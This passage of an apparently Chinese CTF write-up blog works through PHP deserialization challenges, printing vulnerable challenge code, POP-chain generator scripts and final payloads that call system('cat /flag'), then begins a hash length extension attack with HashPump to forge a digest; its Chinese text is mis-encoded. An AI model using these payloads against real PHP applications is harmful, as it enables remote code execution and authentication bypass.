</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯æ­£åˆ™ç»•è¿‡ï¼š&#x2F;[oc]:\d+:&#x2F;i<br>è¿™æ®µæ­£åˆ™çš„æ„æ€æ˜¯åŒ¹é…æ‰€æœ‰çš„ä»¥oã€cã€Oã€Cå¼€å¤´ï¼ŒåŠ å†’å·:ï¼ŒåŠ æ•°å­—ã€å†åŠ å†’å·:çš„å­—ç¬¦ä¸²ï¼Œå¿½ç•¥å¤§å°å†™ï¼Œä¹Ÿå°±æ˜¯o:4:è¿™éƒ¨åˆ†åºåˆ—åŒ–ä¸²å¼€å¤´çš„åŒ¹é…ã€‚è¿™é‡Œä½¿ç”¨+4ç»•è¿‡ï¼Œè¿™æ˜¯å› ä¸ºè¿™æ ·å³ç»•è¿‡äº†è¿™é‡Œæ­£åˆ™çš„æ¡ä»¶ï¼Œç”±ä¸ä¼šæ”¹å˜oåé¢çš„å€¼ï¼Œå› ä¸º+4ä¸4æ˜¯ç›¸åŒçš„ï¼Œä¸ä¼šå½±å“ååºåˆ—åŒ–çš„ç»“æœã€‚<br>å…¶æ¬¡æ˜¯wakeupï¼Œwakeupåªéœ€è¦æŠŠåºåˆ—åŒ–å­—ä¸²çš„å¯¹è±¡å±æ€§ä¸ªæ•°1æ”¹ä¸ºåˆ«çš„æ•°å­—å°±è¡Œäº†ï¼Œä½†æ˜¯æ³¨æ„è¿™é‡Œfile çš„ç±»å‹æ˜¯privateï¼Œæ‰€ä»¥æ‰“å°å‡ºæ¥çš„ä¸²æ˜¯æœ‰ä¸å¯è§å­—ç¬¦%00çš„ï¼Œä¸è¦å¤åˆ¶å‡ºæ¥è‡ªå·±baseï¼Œä¸ç„¶ç»“æœå°±ä¸ä¸€æ ·äº†ã€‚&lt;?php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;<span class="comment">//O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;%00Demo file%00&quot;;s:8:&quot;fl4g.php&quot;;&#125;  fileç§æœ‰å˜é‡è®°å¾—åŠ %00</span></span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;O:4&quot;</span>,<span class="string">&quot;O:+4&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:1:&quot;</span>,<span class="string">&quot;:2:&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span></span><br></pre></td></tr></table></figure><p>###[NISACTF 2022]popchains</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">Happy New Year~ MAKE A WISH</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Road_is_Long</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/***************************pop your 2022*****************************/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;page = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span>-&gt;page;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;page)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You can Not Enter 2022&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;page = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;effort = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;effort;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**********************Try to See flag.php*****************************/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé¢˜ç›®æœ‰ä¸€ä¸ªæ–‡ä»¶åŒ…å«è¯»å–flagï¼Œå…ˆæ‹ä¸€ä¸‹è§¦å‘é¡ºåº</p><p>å€’ç€æ¥çš„ï¼šappend-&gt;invoke-&gt;get-&gt;tostring-&gt;construct</p><p>pocé“¾å°±æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Road_is_Long</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;page=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; <span class="keyword">string</span> = <span class="keyword">new</span> <span class="title class_">Make_a_Change</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; <span class="keyword">string</span> -&gt; effort = <span class="keyword">new</span> <span class="title class_">Try_Work_Hard</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><h3 id="SWPUCTF-2022-æ–°ç”Ÿèµ›-ez-1zpop"><a href="#SWPUCTF-2022-æ–°ç”Ÿèµ›-ez-1zpop" class="headerlink" title="[SWPUCTF 2022 æ–°ç”Ÿèµ›]ez_1zpop"></a>[SWPUCTF 2022 æ–°ç”Ÿèµ›]ez_1zpop</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dxg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$impo</span>=<span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md51</span>=<span class="string">&#x27;weclome&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md52</span>=<span class="string">&#x27;to NSS&#x27;</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> dxg;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> dxg;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">fmm</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;impo) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md51) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md52) &amp;&amp; <span class="variable language_">$this</span>-&gt;md51 != <span class="variable language_">$this</span>-&gt;md52)</span><br><span class="line">         <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">fmm</span>();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable language_">$this</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;https://www.ctfer.vip&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$title</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">      <span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;title);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>])) &#123;</span><br><span class="line">   <span class="variable">$Data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç°æ‰¾å¯åˆ©ç”¨çš„ç‚¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">      <span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;title);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>æŠŠ$bå½“åšå‡½æ•°è°ƒç”¨äº†ï¼Œ$bçš„å€¼ä¸º$this-&gt;a;  å‘½ä»¤ä¸ºï¼ˆ$this-&gt;title);ä¾‹system()</p><p>å¯ä»¥åˆ©ç”¨è¿™ä¸ªï¼Œå°†açš„å€¼æå‰å†™å¥½ä¸ºsystemï¼Œtitleä¸ºls  cat flagå•¥çš„</p><p>$bå°±ä¼šè¢«èµ‹å€¼ä¸ºsystemï¼Œå†…å®¹ä¸ºls</p><p>åœ¨itç±»ä¸­è§¦å‘__wake upï¼Œä¼šè¿”å›åˆ°ä¸€ä¸ªæ²¡æœ‰ç”¨çš„ç±»é‡Œï¼Œè¦ç»•è¿‡ä¸€ä¸‹</p><p>æ¢³ç†ä¸‹æ¥ï¼Œå°±æ˜¯construct-&gt;to_string-&gt;destruct</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$impo</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$md51</span> = <span class="string">&#x27;s878926199a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$md52</span> = <span class="string">&#x27;s155964671a&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;https://www.ctfer.vip&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$title</span>=<span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lt</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;impo=<span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:2:&quot;lt&quot;:3:&#123;s:4:&quot;impo&quot;;O:3:&quot;fin&quot;:3:&#123;s:1:&quot;a&quot;;s:6:&quot;system&quot;;s:3:&quot;url&quot;;s:21:&quot;https://www.ctfer.vip&quot;;s:5:&quot;title&quot;;s:4:&quot;ls /&quot;;&#125;s:4:&quot;md51&quot;;s:11:&quot;s878926199a&quot;;s:4:&quot;md52&quot;;s:11:&quot;s155964671a&quot;;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2023/08/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/1/hexoblog/source/image/image-20230804203006691-1700990458631-265.png" alt="image-20230804203006691"><p>æœ€ç»ˆplayload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?NSS=O:2:&quot;lt&quot;:4:&#123;s:4:&quot;impo&quot;;O:3:&quot;fin&quot;:3:&#123;s:1:&quot;a&quot;;s:6:&quot;system&quot;;s:3:&quot;url&quot;;s:21:&quot;https://www.ctfer.vip&quot;;s:5:&quot;title&quot;;s:9:&quot;cat /flag&quot;;&#125;s:4:&quot;md51&quot;;s:11:&quot;s878926199a&quot;;s:4:&quot;md52&quot;;s:11:&quot;s155964671a&quot;;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> unserialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jwt&amp;struts2</title>
      <link href="/2023/07/29/jwtstruts/"/>
      <url>/2023/07/29/jwtstruts/</url>
      
        <content type="html"><![CDATA[<h1 id="ctfâ€“webâ€“jwt2struts"><a href="#ctfâ€“webâ€“jwt2struts" class="headerlink" title="*ctfâ€“webâ€“jwt2struts"></a>*ctfâ€“webâ€“jwt2struts</h1><p>è®°å½•ä¸€ä¸‹</p><p>æ‰“å¼€å‘ç°ï¼ŒçŒœæµ‹ä¸ºjwtä¼ªé€ </p><blockquote><p>You are now logged in as user. Try to become admin.</p></blockquote><p>CTRL+U</p><blockquote><p>JWT_key.php</p></blockquote><p>ç¬¬ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œæƒ³åŠæ³•æ‹¿åˆ°Jwtä¼ªé€ çš„key</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./secret_key.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./salt.php&quot;</span>;</span><br><span class="line"><span class="comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span></span><br><span class="line"><span class="comment">//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</span></span><br><span class="line">@<span class="variable">$username</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">@<span class="variable">$password</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$password</span> != <span class="string">&quot;root&quot;</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="variable">$username</span>.<span class="variable">$password</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;The secret_key is &quot;</span>. <span class="variable">$secret_key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ª</p><h2 id="å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»"><a href="#å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»" class="headerlink" title="å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»"></a>å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»</h2><p>ç”¨å·¥å…·<a href="https://github.com/bwall/HashPump">hashpump</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/bwall/HashPump.git</span><br><span class="line">$ apt-get install g++ libssl-dev</span><br><span class="line">$ <span class="built_in">cd</span> HashPump</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br><span class="line">$ ./hashpump</span><br></pre></td></tr></table></figure><blockquote><p>input Signature&#x3D; e6ccbf12de9d33ec27a5bcfb6a3293df  &#x2F;&#x2F;è¿™é‡Œå¡«å·²ç»æœ‰çš„hashå€¼</p><p>input  Data&#x3D;adminroot  &#x2F;&#x2F;è¿™é‡Œå¡«å·²çŸ¥çš„ï¼Œä¹Ÿå°±æ˜¯ä½ è¦ä¸Šä¼ çš„</p><p>input Key&#x3D;14  &#x2F;&#x2F;è¿™é‡Œå¡«æœªçŸ¥çš„å¯†æ–‡é•¿åº¦ï¼Œé¢˜ç›®ç»™äº†14</p><p>input Data to Add&#x3D;  abcd &#x2F;&#x2F;è¿™é‡Œå¡«ä½ è‡ªå·±è¦æ·»åŠ çš„å­—ç¬¦ä¸²ï¼Œé•¿åº¦å°½é‡å¤§äº2</p></blockquote><p><img src="/2023/07/29/jwtstruts/image/image-20230729211158878-1700990370543-203-1700994565105-177.png"></p><blockquote><p>adminroot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00abcd</p></blockquote><p>æŠŠ\xæ›¿æ¢ä¸º%</p><p>å› ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">$username</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">@<span class="variable">$password</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]);</span><br></pre></td></tr></table></figure><p>passwordè¿›è¡Œäº†ä¸€æ¬¡urlè§£ç ï¼Œæˆ‘ä»¬è¦å…ˆæå‰å¯¹å®ƒè¿›è¡Œä¸€æ¬¡urlç¼–ç </p><blockquote><p>root%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b8%00%00%00%00%00%00%00abcd</p></blockquote><p>ç¼–ç 